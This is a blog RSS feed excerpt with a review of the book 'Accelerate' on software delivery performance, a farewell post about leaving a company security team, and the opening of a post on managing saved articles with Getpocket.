<li>Strong leadership but also agile practices like Lean, Scrum, Kanban will help you to focus on your customer needs, implement requested features and adapt if needed</li>
<li>Continuous Delivery (CD) plays a vital role and is driven by a DevOps oriented mindset</li>
</ul>
<h2 id="introduction">Introduction</h2>
<p>Usually I don&rsquo;t do book reviews. I just tend to collect my notes and thoughts in my
<a href="https://brainfck.org">Zettelkasten</a>. But this time I wanted to share some insights, write them down and convince
you why you should read this book. <a href="https://brainfck.org/#Accelerate">Accelerate</a> is not about <strong>software
engineering</strong> nor entirely about <strong>DevOps</strong>. It does have something to do with the <a href="https://agilemanifesto.org/">Agile
manifesto</a> but from a more data-driven, scientific point of view. To be more precise, the
authors <strong>analyzed</strong> over many years factors that enabled teams to deliver software (features)
in short cycles while still limiting technical debt and having a stable and secure
deployment process.</p>
<h3 id="big-picture">Big picture</h3>
<p>If you want to skip the details, just have a look at this diagram and try to understand how software delivery is impacted by different areas.</p>

    


<a href="/posts/img/2021/accelerate-big-picture.png" class="glightbox" data-glightbox="title:Accelerate Big Picture; description: Which factors lead to software deliver improvement? There are different factors that are somehow inter-dependent; descPosition: left">
    <img src="/posts/img/2021/accelerate-big-picture.png" alt="image">
</a>

<h2 id="speed">Speed</h2>
<p>Why is speed so important? Because it does make a difference how fast you can &ldquo;conquer&rdquo; a market and
deliver value to your customers. Or as the authors put it:</p>
<blockquote>
<p>Business as usual is no longer enough to remain competitive. Organizations in all
industries, from finance and banking to retail, telecommunications, and even government,
are turning away from delivering new products and services using big projects with long
lead times. Instead, they are using small teams that work in short cycles and measure
feedback from users to build products and services that delight their customers and
rapidly deliver value to their organizations. These high performers are working
incessantly to get better at what they do, letting no obstacles stand in their path, even
in the face of high levels of risk and uncertainty about how they may achieve their goals.</p>
<p>At the heart of this acceleration is software.</p>
<p>&ndash; <a href="https://brainfck.org/#Accelerate">Accelerate</a></p>
</blockquote>
<h2 id="software-delivery-performance">Software delivery performance</h2>
<p>Research presented in the book has found <strong>24</strong> key capababilities that seem to drive <strong>software
development performance</strong>. If you are a <strong>high-performer</strong> or a <strong>low-performer</strong> merely depends on
the capabilities you, your team and your organization focus on. The authors have defined 5
categories for these capabilities:</p>
<ul>
<li><strong>Continuous Delivery (CD)</strong></li>
<li><strong>Architecture</strong>
<ul>
<li>architectural characteristics</li>
</ul>
</li>
<li><strong>Product and process</strong></li>
<li><strong>Lean Management and Monitoring</strong></li>
<li><strong>Culture</strong></li>
</ul>
<p>Before we go into deep discussion, let me try to summarize why <strong>capabilities</strong> matter more than <strong>maturity</strong>.</p>
<h2 id="capabilities-vs-maturity">Capabilities vs Maturity</h2>
<p>Lots of <strong>mature</strong> organizations think they own a quite big piece of cake when it comes to
market share. While relying on that, they tend to become less innovative, have complicated
internal processes (slows down the overall development process), lose talented
high-performers (who wants to work in a slow, process-heavy environment?). Instead they
should focus on certain capabilities in order to <strong>drive continuously improvement</strong>.</p>
<p>Once organizations arrive at a mature state, they see their journey as accomplished and
declare themselves done. However, this way they don&rsquo;t adapt to technological changes and
those within the business landscape. High-performing organizations are <strong>always striving to
be better</strong> and never consider themselves as done or mature.</p>
<blockquote>
<p>Technology leaders need to deliver software quickly and reliably to win in the market. For
many companies, this requires significant changes to the way we deliver software. The key
to successful change is measuring and understanding the right things with a focus on
capabilitiesâ€”not on maturity.</p>
<p>&ndash; <a href="https://brainfck.org/#Accelerate">Accelerate</a></p>
</blockquote>
<p>Mature organizations not only have a bad time to keep up with new technologies but they
also <strong>prescribe the same set of technologies</strong> for every set of teams in order to progress.
The better approach would be to take into consideration current context, used systems,
goals and constraints and focus on the capabilities that will give the teams the most
benefit. This way different parts of the organization are allowed to take a customized
approach to improvement.</p>
<p><strong>Maturity models</strong> also tend to define a static level of technological, procedural and
organizational abilities to be achieved. What is good enough and high-performing today,
might no longer be good enough next year.</p>
<h2 id="measuring-performance">Measuring performance</h2>
<p>Most organizations focus on &ldquo;old-school&rdquo; technical measures like lines of code, velocity
which measure some performance locally (in general within a limited scope) rather than on
a more global one. Developers (and DevSecOps folks as well) are supposed to <strong>solve business
problems</strong> and therefore focus on a <strong>global outcome</strong> and not output. It doesn&rsquo;t matter how
many lines of code your team has, how often you deploy, how many Security tools you have
implemented within your CI/CD pipeline. If it doesn&rsquo;t help to achieve organizational
goals, then you&rsquo;re focussing more on the output rather than outcome.</p>
<h3 id="software-delivery-performance">Software Delivery Performance</h3>
<p>Since it should be clear by now that the faster you are able to deliver your software to
your customers, the more you&rsquo;re confident you&rsquo;re doing the right things, the book defines
4 criterias for software delivery performance:</p>
<ul>
<li><strong>Delivery Lead Time</strong>
<ul>
<li>you would usually measure
<ul>
<li>time to design and validate customer request</li>
<li>time to deliver feature to customer</li>
</ul>
</li>
</ul>
</li>
<li><strong>Deployment frequency</strong>
<ul>
<li>the work load here is very important</li>
<li>you should slice you work in small batches that can be completed in a short time period (a week or even less)</li>
<li>decompose your work into small features
<ul>
<li>this will allow rapid development</li>
<li>you should be able to deploy more frequently</li>
</ul>
</li>
<li>use <strong>MVPs</strong> to first validate the requirements and to incorporate customer feedback
<ul>
<li>this way to can create value very quickly</li>
<li>you can still have <strong>clean code</strong> and all the things <strong>after</strong> you&rsquo;re sure you&rsquo;re building the right thing</li>
</ul>
</li>
</ul>
</li>
<li><strong>Mean Time to Restore</strong> (MTTR)
<ul>
<li>the average time to restore services</li>
</ul>
</li>
<li><strong>Change fail percentage</strong>
<ul>
<li>this failure rate measures how often deployment failures occur in production that require immediate attention and remediation (e.g. rollbacks)</li>
<li>this also applies to infrastructure configuration changes</li>
</ul>
</li>
</ul>
<h3 id="how-fast-is-fast">How fast is fast?</h3>
<p>After presenting the criterias, let&rsquo;s have a look at some raw numbers.</p>
<div class="table-caption">
  <span class="table-number">Table 1</span>:
  Software Delivery Performance in 2017
</div>
<table>
<thead>
<tr>
<th>2017</th>
<th>High Performers</th>
<th>Medium Performers</th>
<th>Low Performers</th>
</tr>
</thead>
<tbody>
<tr>
<td>Deployment Frequency</td>
<td>on demand (multiple times per day)</td>
<td>Between once per week and once per month</td>
<td>Between once per month and once every 6 months</td>
</tr>
<tr>
<td>Delivery Lead Time</td>
<td>&lt; 1 hour</td>
<td>Between one week and one month</td>
<td>Between one month and 6 months</td>
</tr>
<tr>
<td>MTTR</td>
<td>&lt; 1 hour</td>
<td>&lt; 1 day</td>
<td>&lt; 1 day</td>
</tr>
<tr>
<td>Change fail rate</td>
<td>0-15%</td>
<td>0-15%</td>
<td>31-45%</td>
</tr>
</tbody>
</table>
<p>As you can see high-performers have a quite high deployment frequency and most important
the delivery lead time is extremely fast.</p>
<h2 id="how-to-accelerate">How to accelerate</h2>
<p>Now that you knwo the key metrics when it comes to <strong>software delivery performance</strong> how do
you actually <em>accelerate</em> and start changing your organization? Of course you can</p>
<ul>
<li>change the <strong>culture</strong> within you deliver value</li>
<li>improve on a <strong>technical</strong> level</li>
<li>have an effective <strong>architecture</strong></li>
<li>invest in a strong <strong>leadership</strong></li>
</ul>
<p>Let&rsquo;s dissect each one piece by piece.</p>
<h3 id="change-culture">Change culture</h3>
<p>In order to understand which changes are good for your organizations, sociologist <em>Ron
Westrum</em> has defined a model on importance of <strong>organizational culture</strong>. Before he was
researching on human factors in system saftey, especially in the context of accidents in
technological domains that were highly complex and risky (aviation and healthcare). From
his point of view organization culture is vital because it defines how <strong>information flows
through an organization</strong>. He defines following types of organizations:</p>
<h4 id="orgnization-types">Orgnization types</h4>
<ul>
<li><strong>pathological (power-oriented)</strong>
<ul>
<li>characterized by large amounts of fear and threat</li>
<li>information is not made transparent and/or is withhold for political reasons</li>
</ul>
</li>
<li><strong>Bureaucratic (rule-oriented)</strong>
<ul>
<li>protect departments</li>
<li>those in the department want to maintain their turf (area)</li>
<li>insist on their own rules</li>
<li>do things by their book</li>
</ul>
</li>
<li><strong>Generative (performance-oriented)</strong>
<ul>
<li>focus on the mission</li>
<li>everything is focused on good performance, to doing what is supposed to do</li>
</ul>
</li>
</ul>
<p>In Westrum&rsquo;s theory <strong>information flow</strong> within an organization has a <strong>huge impact</strong> on its performance:</p>
<ul>
<li>good culture requires <strong>trust</strong> and <strong>cooperation</strong> between people across the organization
<ul>
<li>it also maps the way how team collaborate in the company</li>
</ul>
</li>
<li>having a good organization culture can have an impact on the quality of <strong>decision-making</strong>
<ul>
<li>if information is made transparent and available, taking decisions is way easier</li>
<li>you can also reverse the decisions if they turn out to be wrong
<ul>
<li>no blame game</li>
<li>seek for trial and error</li>
</ul>
</li>
</ul>
</li>
<li>teams within thise open environment are more likely to do a batter job, since problems and conflicts are rapidly discovered and addressed</li>
</ul>



<blockquote class="notice info">
  You can read more about Westrum&rsquo;s organizational culture on <a href="https://cloud.google.com/architecture/devops/devops-culture-westrum-organizational-culture">Google&rsquo;s DevOps guide</a>.
</blockquote>

<h3 id="change-technical-practices">Change technical practices</h3>
<p>Among the software and tools you use within your team, there is one <em>capability</em> that seems
to have a big impact on your overall performance: <strong>Continuous Delivery</strong>.</p>
<h4 id="continuous-delivery">Continuous Delivery</h4>
<p><em>Continuous Delivery</em> is a set of capabilities to enable changes of all kinds (features, configuration changes, bug fixes, experiments) go into production &ldquo;safely&rdquo;, &ldquo;quickly&rdquo; and &ldquo;suistanably&rdquo;. There are some <em>principles</em>:</p>
<ul>
<li><strong>Build quality in</strong>
<ul>
<li>Eliminate the need for mass inspection by building quality into the product in the first place</li>
<li>invest a culture supported by tools and people where issues can be detected quickly</li>
<li>issues should be fixed straight away when they&rsquo;re cheap to detect and resolve</li>
</ul>
</li>
<li><strong>Work in small batches</strong>
<ul>
<li>split work in smaller chunks that deliver measurable business outcomes on a small part of the market</li>
<li>through feedback the course can be corrected</li>
<li>also a key goal is to change the economics of the software delivery process in order to minimize the cost of cost of changes</li>
</ul>
</li>
<li><strong>Computers perform repetitive tasks, people solve problems</strong>
<ul>
<li>take long repetitive work (testing, deployments) and invest in simplyfing and automating this work</li>
<li>this way &ldquo;people&rdquo; have more time for problem-solving work</li>
</ul>
</li>
<li><strong>Relentlessly pursue continuous improvement</strong>
<ul>
<li>high-performers are never satisfied</li>
<li>they make improvement part of their daily work and culture</li>
</ul>
</li>
<li><strong>Everyone is responsible</strong>
<ul>
<li>everyone involved in the software delivery process has to work together</li>
</ul>
</li>
</ul>
<p>In order to implement <strong>CD</strong> following <strong>foundations</strong> should be created:</p>
<ul>
<li>Comprehensive configuration management
<ul>
<li>build, test and deploy software fully in an automated manner from information stored in a version control system</li>
<li>any changes should be applied in the version control</li>
</ul>
</li>
<li><a href="https://brainfck.org/#Continuous%20Integration%20(CI)">Continuous Integration (CI)</a></li>
<li><a href="https://brainfck.org/#Continuous%20Testing"> Continuous Testing</a></li>
</ul>
<p>During their research the authors have identified following <strong>key drivers</strong> for continuous delivery:</p>
<ul>
<li><strong>Version Control</strong>
<ul>
<li>I guess this one is indisputable</li>
</ul>
</li>
<li><strong>Deployment Automation</strong></li>
<li><strong>Continuous Integration</strong>
<ul>
<li>use Trunk-Based development</li>
<li>each change triggers a build process (incl. running test suites)</li>
<li>if any part of the process fails, developers should be notified immediately</li>
</ul>
</li>
<li><strong>Trunk-Based Development</strong>
<ul>
<li>don&rsquo;t use long-lived feature branches; keep them short</li>
<li>merge with trunk/master as soon as possible</li>
<li>deploy changes into production as fast as possible</li>
</ul>
</li>
<li><strong>Continuous Testing</strong>
<ul>
<li>tests should run as a vital part of the development process</li>
<li>automated unit tests and acceptance tests should run against every change in VC (version control) in order to give developers immediate feedback on their changes</li>
<li>also check <a href="https://brainfck.org/#Software%20Testing">Software Testing</a></li>
</ul>
</li>
<li><strong>Test Data Management</strong>
<ul>
<li>when dealing with automated tests, managing test data can be challenging</li>
<li>high-performers use to have proper test data for the testing</li>
</ul>
</li>
<li><strong>Shift Left on Security</strong>
<ul>
<li>this is a broad topic and it&rsquo;s basically about the idea that you apply Security measures very early in the development process</li>
<li>you could do consultancy work and help developers to implement new features with a hacker mindset</li>
<li>you could apply automated Security testing as part of your tests suite</li>
</ul>
</li>
<li><strong>Loosely Coupled Architecture</strong>
<ul>
<li>software architecture can become a significant barrier when you want to increase the stability of the release process and the speed you deliver new features</li>
<li>architectural decisions and constraints do have an impact on delivery performance</li>
<li>an effective architecture should enable teams to easily test and deploy <strong>individual</strong> components/services even if the organization or the number of systems it owns/operates grow</li>
<li>this should allow productivity to increase while having scalability</li>
</ul>
</li>
</ul>
<h3 id="change-architecture">Change architecture</h3>
<p>As I&rsquo;ve mentioned previously a <strong>loosely coupled architecture</strong> enabled high-performers to better build and maintain systems. No matter what kind of systems you are building
there should be little communication required between delivery teams in order to get work done. Futhermore the architecture of your systems should <em>enable</em> teams to test, deploy and change systems without depending on other teams. Communication channels should not be ignored completely. However, they should be used for discussing high-level <em>shared</em> goals and how to achieve/implement them. Fine-grained decision-making on a technical level should only take place within the teams - unless you are required to
discuss technical stuff with other members as well. Also important: <strong>Let the teams chose tools and technologies</strong>. (Good software) architects should focus on concepts, engineers and outcomes, not on technical discussion and concrete tools/technologies.</p>



<blockquote class="notice info">
  Also check out my bookmarks and notes on <a href="https://brainfck.org/#Architecture">architecture</a>. I also recommend reading <a href="https://brainfck.org/#The%20Clean%20Architecture">The Clean Architecture</a> and <a href="https://brainfck.org/#The%20Clean%20Code">The Clean Code</a>.
</blockquote>

<h3 id="change-product-management">Change product management</h3>
<p>If you&rsquo;ve noticed already, the book title mentions <em>The Science of Lean Software and DevOps</em>. While most of you probably know what <strong>DevOps</strong> is about, what is <strong>Lean Software</strong>?
The term itself (<em>Lean</em>) derives from <em>Lean Management</em> and used to be Toyota&rsquo;s approach to car (manufacturing):</p>
<ul>
<li>originally designed to solve the problem of creating a wide variety of different types of cars for the Japanese market</li>
<li>this enabled Toyota to build cars faster, cheaper and with higher quality than the competition</li>
<li>the US manufacturing industry only survived by adopting these ideas and methods</li>
</ul>
<p>How can these methods be applied to software engineering? Well, let&rsquo;s have a look at some characteristics:</p>
<ul>
<li><strong>Limit work in progress</strong>
<ul>
<li>work in small batches (as mentioned previously)</li>
<li>the idea is to have work decomposed into features that allow rapid development, instead of complex features developed on (feature) branches and deployed infrequently</li>
<li>merge with trunk/master as fast as possible</li>
</ul>
</li>
<li><strong>Visual management</strong>
<ul>
<li>create and maintain visual displays to show key quality and productivity metrics and the current status of work (also problems)</li>
<li>make these displays available to both engineers and leaders</li>
<li>align these goals with operational goals</li>
</ul>
</li>
<li><strong>Feedback from production</strong>
<ul>
<li>Use data from application performance and infrastructure monitoring tools to make business relevant decisions on a daily basis</li>
</ul>
</li>
<li><strong>Lightweight change approvals</strong>
<ul>
<li>have a easy-to-follow change management process</li>
<li>teams should be allowed to try out new ideas, create and update requirements during development process without any approval of people outside the team</li>
<li>no time intensive approvals by external entities (boards, managers etc.)</li>
</ul>
</li>
</ul>
<h3 id="make-people-happy">Make people happy</h3>
<p>While technical practices have an impact on the ability to deliver software quickly, they can also help to reduce stress and anxiety related to the fear of breaking something.
When people are not confident that their changes will break anything in production, their productivity and motivation decline. In order to reduce deployment pain and reduce the risk of a burnout, the authors recommend to:</p>
<ul>
<li>design and build systems to be deployed easily into multiple environments
<ul>
<li>failures can be asily detected and mitigated</li>
<li>various components of the systems can be updated independently</li>
</ul>
</li>
<li>make sure that state of production systems can be reproduced in an automated manner from version control</li>
<li>design and implement the deployment process as simple as possible</li>
</ul>
<h3 id="have-strong-leadership">Have strong leadership</h3>
<p>While <em>leader != manager</em>, leadership should be about inspiring and motivating people surrounding you. Even more: A <strong>transformational leadership</strong> should affects a team&rsquo;s
ability to:</p>
<ul>
<li>deliver code</li>
<li>architect good systems</li>
<li>apply <em>Lean Software</em> development pratices (as descrived before)</li>
</ul>
<p>These are the characterstics of a good transformational leader (Rafferty and Griffin 2004):</p>
<ul>
<li><strong>vision</strong>
<ul>
<li>has clear understanding where the currently the org is and where it should be in the next 5 years</li>
</ul>
</li>
<li><strong>inspirational communication</strong>
<ul>
<li>inspires and motivates, even in an uncertain or changing environment</li>
</ul>
</li>
<li><strong>intellectual stimulation</strong>
<ul>
<li>challenges followers to think about problems in new ways</li>
</ul>
</li>
<li><strong>Supportive leadership</strong>
<ul>
<li>demonstrates care and consideration</li>
</ul>
</li>
<li><strong>Personal recognition</strong>
<ul>
<li>praises and acknowledges achievement of goals/improvements in work quality</li>
</ul>
</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>DevOps and Agile are already used by many organizations as part of their transformation strategy. They encourage a culture of transparency, shared responsability, faster feedback
and automization. <a href="https://brainfck.org/#Accelerate">Accelerate</a> is the scientific, data-driven approach to put all pieces together, to show you how they depend on each other and finally achieve a better organizational performance.  And while software is at the heart of most modern companies it is essential to have a solid, stable and secure software delivery process.</p>
<p>For me this book was definitely one the most influencial ones I&rsquo;ve read in the past years.
You might also check out <a href="https://itrevolution.com/faculty/gene-kimother">other books by
Gene Kim</a> (he is one of the authors) if you&rsquo;re interested in DevOps, Agile transformation
and successful user stories. Beside that I also recommend the
<a href="https://sre.google/books/">Google SRE books</a>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Bye bye Scout24!</title>
      <link>https://blog.dornea.nu/2021/09/15/bye-bye-scout24/</link>
      <pubDate>Wed, 15 Sep 2021 00:00:00 +0200</pubDate>
      
      <guid>https://blog.dornea.nu/2021/09/15/bye-bye-scout24/</guid>
      <content:encoded><![CDATA[
    


<a href="/posts/img/2021/bye-bye-scout24.jpg" class="glightbox" data-glightbox="title:Bye Bye Scout24!; description: After more than 5 years it&#39;s time to look after new challenges. I enjoyed my time there and also the stickers I&#39;ve collected during the years.; descPosition: left">
    <img src="/posts/img/2021/bye-bye-scout24.jpg" alt="image">
</a>

<p>I guess it&rsquo;s become a tradition to write <em><a href="/tags/byebye">bye bye</a></em> posts whenever I switch jobs. So this happens again as I&rsquo;ve decided to pursue new opportunities elsewhere. I feel sad but also excited at the same time. Working for 5 years for the same company (I do know that&rsquo;s not thaaaat long) feels like I&rsquo;ve spent half of my life there. Since 2016 many colleagues have left the company and new ones joined the Security team which I was part of. During these 5 years the Security team has made a quite succesful transition from a mostly <strong>red team</strong> to a <strong>blue team</strong> one. While at the beginning I was doing <strong>penetration tests</strong> like there was no tomorrow, I now leave my team with internal self-built, self-managed security products (mostly in <a href="/tags/python">Python</a> ,<a href="/tags/golang">Golang</a> ) for the developer teams at Scout24.</p>
<h2 id="things-i-ve-learned">Things I&rsquo;ve learned</h2>
<p>And while I had the opportunity to improve my pentest skills (mostly web applications), there are tons of new
things I&rsquo;ve learned:</p>
<ul>
<li><a href="/tags/aws">AWS</a>
<ul>
<li>Before joining Scout24 I completely had no cloud experience</li>
<li>I&rsquo;m still not an expert but I can get along. My team got used to this quote:
<em>AWS is like a kitchen. You just use whatever you need for your dish.</em></li>
</ul>
</li>
<li><a href="https://brainfck.org/#Serverless">Serverless</a>
<ul>
<li>The very first time I worked on a serverless project (codestripper) it felt like magic</li>
<li>It was so <em>magic</em> that I&rsquo;ve generated my first so called <em>5k Issue</em></li>
<li>I&rsquo;ve learned that coding for a cloud + serverless environment is so much different than running your code on your laptop/inside docker</li>
</ul>
</li>
<li><a href="/tags/golang">Golang</a>
<ul>
<li>I was the first one in the team to setup a quite complex Golang project
<ul>
<li>@Ralph: I know you were actually the first one. But the mini snippets you&rsquo;ve used don&rsquo;t really count :D</li>
</ul>
</li>
<li>This year I was able to convince the team to start a new project (related to <a href="https://dependabot.com/">dependabot</a>) in Go (instead of <a href="/tags/python">Python</a> )</li>
<li>I was amazed and surprised how fast we were able to add more and more features while having a steep learning curve</li>
<li>I&rsquo;ve held my &ldquo;<strong>Golang for Hackers</strong>&rdquo; workshop for the Security team where I&rsquo;ve shown how to build small Golang applications for compromised systems (e.g. port scanners, TOR clients, DNS tunneling)</li>
</ul>
</li>
<li><a href="/tags/python">Python</a>
<ul>
<li>Although I&rsquo;ve been coding in Python since years, contributing to an enterprise software project was a different experience</li>
<li>For the first time in my life I was forced to write unit tests (thanks David!) and think about CI/CD</li>
<li>Doing complex stuff in Python also showed me it&rsquo;s weaknesses and there are some good reasons why I still prefer static typed languages (like <a href="/tags/golang">Golang</a>) for big projects</li>
</ul>
</li>
</ul>
<h2 id="thanks-to">Thanks to</h2>
<p>Without any claim to completeness I&rsquo;ve setup a list of people I&rsquo;d like to express my gratitude and appreciation to. Many of them already left Scout24 but their thoughts (and attitude!) had a huge impact on my personal growth. Here it goes (in somehow chronological order):</p>
<ul>
<li><strong>Ralph</strong>
<ul>
<li>Thanks for being a buddy and for our lovely <em>office romance</em></li>
<li>You still owe me a bottle of <a href="https://en.wikipedia.org/wiki/%C8%9Auic%C4%83">ÈšuicÄƒ</a></li>
<li>Thanks for sharing your <em>Netzwerkgehampel</em> (German for colloquial &ldquo;network stuff&rdquo;) with me</li>
</ul>
</li>
<li><strong>David V</strong>.
<ul>
<li>Dude, do you remember our pentest sessions?</li>
<li>Especially the PHP related ones?</li>
<li>I hope you&rsquo;re well (what about your cats?)</li>
</ul>
</li>
<li><strong>FridtjÃ¶f</strong>
<ul>
<li>Thanks for on-boarding me</li>
<li>Do you remember that 1:1 ssession where I&rsquo;ve told you behind you some strange guy is wattering his plants on the balcony completely <strong>naked</strong>? Sorry for this (funny) anecdote but I guess I won&rsquo;t forget that situation for my whole life</li>
</ul>
</li>
<li><strong>Markus</strong>
<ul>
<li>Thanks for pushing me beyond my limits, for making me to think big</li>
<li>You were like a mentor for me, always calm and always close to the team</li>
<li>Also thanks for the BBQ partys and the discussions we had at <a href="https://reinforce.awsevents.com/">AWS Re:inforce</a></li>
</ul>
</li>
<li><strong>Alex</strong>
<ul>
<li>Mon ami, I&rsquo;ve really enjoyed our lunch dates and the training sessions we had in the fitness room</li>
<li>I wish you all the best on your new carrer path</li>
</ul>
</li>
<li><strong>Teo</strong>
<ul>
<li>Dude, you&rsquo;re really fast at coding!</li>
<li>I hope you were not feeling that alone in Munich</li>
<li>Looking forward to your SaaS</li>
</ul>
</li>
<li><strong>Hussam</strong>
<ul>
<li>I really convinced you to learn <a href="/tags/golang">Golang</a>! I&rsquo;m so proud of you</li>
<li>Also thanks for your AWS knowledge-sharing sessions</li>
<li><em>The best or nothing</em>, right?</li>
</ul>
</li>
<li><strong>Slava</strong>
<ul>
<li>Man, if you only knew how deep I got into Emacs and ORG mode! It basically changed the way I work and organize my life</li>
<li>Thanks for your inspiration</li>
</ul>
</li>
<li><strong>Gervais</strong>
<ul>
<li>Mon ami 2, I really enjoyed our political discussions after lunch</li>
<li>I still hope you&rsquo;ll do some ice baths some day :)</li>
<li>And in case you feel cold, just do some Scala compiling (ya know what I&rsquo;m talking about)</li>
</ul>
</li>
<li><strong>David</strong>
<ul>
<li>Unit tests, unit tests, unit tests!</li>
<li>Thanks for doing the frontend related workshops</li>
<li>I really enjoyed our infrastructure/design sessions</li>
</ul>
</li>
<li><strong>Mostafa</strong>
<ul>
<li>Quote of the year: &ldquo;People with fast internet can be very sensitive&rdquo;</li>
<li>Thanks for taking care of all the shit nobody wanted to take care of</li>
<li>Your appsec related workshops/presentations were awesome!</li>
</ul>
</li>
<li><strong>Daniel</strong>
<ul>
<li>Thanks for introducing &ldquo;organized work/planning&rdquo; to the team</li>
<li>I also thank you for making me a more responsible engineer and adopting &ldquo;constructive criticism&rdquo;</li>
</ul>
</li>
<li><strong>Felix</strong>
<ul>
<li>Thanks for attending my &ldquo;Golang for Hackers&rdquo; session</li>
<li>I hope DNS tunneling will have some benefit for you</li>
</ul>
</li>
<li><strong>Abed</strong>
<ul>
<li>Was a pleasure to meet you and do some real work with you</li>
<li>I&rsquo;m looking forward to the next rewrite: Golang to Kotlin, back to Python?</li>
<li>One more thing: Your mouse is still moving! :)</li>
</ul>
</li>
<li><strong>Rakib</strong>
<ul>
<li>Our pairing sessions on some Python code were amazing</li>
<li>I wish you all the best with your studies</li>
</ul>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Inbox Zero using Getpocket</title>
      <link>https://blog.dornea.nu/2021/09/01/inbox-zero-using-getpocket/</link>
      <pubDate>Wed, 01 Sep 2021 00:00:00 +0200</pubDate>
      
      <guid>https://blog.dornea.nu/2021/09/01/inbox-zero-using-getpocket/</guid>
      <content:encoded><![CDATA[<p>After finishing my last post on <a href="/2021/08/15/howto-convert-pocket-reader-links-to-epub-and-upload-to-dropbox/">how to convert getpocket links to epub</a> I was thinking a lot about my current workflow, how
I manage to capture everything that
might be interesting for me and save it for later use. Saving web articles for later reading is not a big deal but dealing with the amount of saved articles requires some management skills. In this post I&rsquo;ll share some best practices on how to organize and categorize your (web) articles in a <a href="https://brainfck.org/#GTD">GTD</a> manner: <a href="https://brainfck.org/#GTD/Input">Capture what has your attention</a>, <a href="https://brainfck.org/#GTD/Buckets">organize your content in buckets</a> and <a href="https://brainfck.org/#GTD%20Managing%20attention">keep an eye on your focus</a>.</p>
<h2 id="requirements">Requirements</h2>
<p>When I had to decide for a &ldquo;read it later&rdquo;/&ldquo;save for later&rdquo; service some years ago, I&rsquo;ve instantly registered an account with <a href="https://getpocket.com">getpocket.com</a> and I still don&rsquo;t regret my decision. But what should a read it later app be capable of? Here is my incomplete list:</p>
<ul>
<li>let&rsquo;s you <strong>save articles</strong> with <strong>one click</strong>
<ul>
<li>ideally there are solutions for different devices (desktop, mobile, e-readers etc.)</li>
<li>you can easily save/*share* the content/articles
<ul>
<li>&ldquo;share to&rdquo; on mobile phones</li>
<li>browser extensions</li>
<li>e-mail service that automatically adds your article to the read it later list when you send an e-mail to that specific address</li>
</ul>
</li>
</ul>
</li>
<li>let&rsquo;s you <strong>organize</strong> your articles
<ul>
<li>you can <strong>tag</strong> items</li>
<li>you can <strong>search</strong> for items
<ul>
<li>either by specific tag or</li>
<li>by keyword</li>
</ul>
</li>
<li>you can <strong>archive</strong> items</li>
<li>you can create lists/*collections* of items</li>
</ul>
</li>
</ul>
<p>Now, for my not so unspecific requirements <code>getpocket</code> has done a very great job and I still feel bad for no purchasing premium.</p>
<h2 id="what-is-inbox-zero">What is Inbox Zero?</h2>
<blockquote>
<p>&ldquo;Unproductive preoccupation with all the things we have to do is the single largest consumer of time and energy&rdquo; - Kerry Glees</p>
</blockquote>
<p><a href="https://brainfck.org/#GTD">GTD</a> proposes to capture everything that has our attention. You can either capture stuff on paper or digitally. And most important of all:
Collection tools should be part of your life style in order to <strong>get everything out of your head</strong>. And for better management you should also minimize the
number of capture locations (at work, at home, on your smartphone, at your desktop, while sitting down, while driving home etc.). <a href="https://brainfck.org/#GTD%20Managing%20attention">Managing attention</a> will eventually not only get things off your mind but also enable you to collect <strong>things</strong> and access them later.</p>
<blockquote>
<p>Your brain is for having ideas, not storing them â€“ David Allen</p>
</blockquote>
<p>Now that you know what GTD is about (I really recommend reading the book since you won&rsquo;t find any explanations around the GTD process on the web. I was using GTD methodologies for years but without knowing how to apply them properly and for which areas to use) what is <strong>inbox zero</strong> about? <a href="https://en.wikipedia.org/wiki/Merlin%5FMann">Merlin Mann</a> popularized the concept of &ldquo;inbox zero&rdquo; which somehow become associated with GTD. Even though <a href="https://www.wired.co.uk/article/inbox-zero-mentality">Mann stated</a> he doesn&rsquo;t keep his inbox empty and everything I <strong>guess</strong> I know about it might be wrong,
let&rsquo;s (re-)define it for our own purposes.</p>
<p>So Inbox Zero is the attempt to keep your inbox empty, or close to empty, at all times. And if you realize everything in your life is an inbox, then you&rsquo;ll see the true benefit of keeping your inbox(es) empty. It not only helps you to make space for new input/ideas, but also use your brain for
what it was built for: Cognitive processes and not for information storage.</p>
<p>While you could apply this methodology to almost everything in life, let&rsquo;s have a look how it could be used for cleaning up your <code>getpocket</code> inbox for better URL management
and how to get most out of your readings.</p>
<h2 id="why-getpocket">Why Getpocket</h2>
<p>Before we get into details, why did I chose <code>getpocket</code> at all?</p>
<ul>
<li>works on nearly every device
<ul>
<li>mobile clients (smartphones, tablets)</li>
<li>desktop clients (browser, native applications)</li>
<li>but also on E-readers (like my PocketBook Inkpad 3)</li>
</ul>
</li>
<li>has great UI</li>
<li>I love their &ldquo;readable&rdquo; content view
<ul>
<li>Now that Mozilla acquired them, most likely they use <a href="https://github.com/mozilla/readability">readability</a></li>
<li>in my <a href="/2021/08/15/howto-convert-pocket-reader-links-to-epub-and-upload-to-dropbox/">last post</a> I was also playing with <a href="https://github.com/eafer/rdrview">rdrview</a> which allows you to have that reader view as a CLI tool</li>
</ul>
</li>
<li>you can access your articles using the API
<ul>
<li>I&rsquo;m still missing some features, though
<ul>
<li>e.g. you cannot extract your highlights</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="alternatives">Alternatives</h3>
<p>Here&rsquo;s a list of alternatives in case you don&rsquo;t want to use getpocket:</p>
<ul>
<li><a href="https://www.instapaper.com/">Instapaper</a>
<ul>
<li>never tried</li>
</ul>
</li>
<li><a href="https://raindrop.io/">raindrop.io</a>
<ul>
<li>implements pretty much the same feature set as Getpocket does</li>
</ul>
</li>
<li><a href="https://github.com/wallabag/wallabag">wallabag</a>
<ul>
<li>this is self-hosted</li>
<li>along with <a href="http://koreader.rocks/">koreader</a> you can also use wallabag on your E-Reader device</li>
</ul>
</li>
</ul>
<p>Apart from these service, there are tons of &ldquo;bookmark managers&rdquo; which they all have their pros and
cons. Feel free to give them a try and chose the one matching your needs best.</p>
<h2 id="buckets">Buckets</h2>
<p>Usually when you send an URL to getpocket it will land in your default list (which is <a href="https://getpocket.com/my-list">my-list</a>). Additionally you might have different other lists (such as <a href="https://getpocket.com/my-list/favorites">favorites</a> or <a href="https://getpocket.com/my-list/archive">archive</a>) available. But again: Those are only the default ones and just categorize your content depending on the content type (<a href="https://getpocket.com/my-list/videos">videos</a>, <a href="https://getpocket.com/my-list/articles">articles</a> etc.
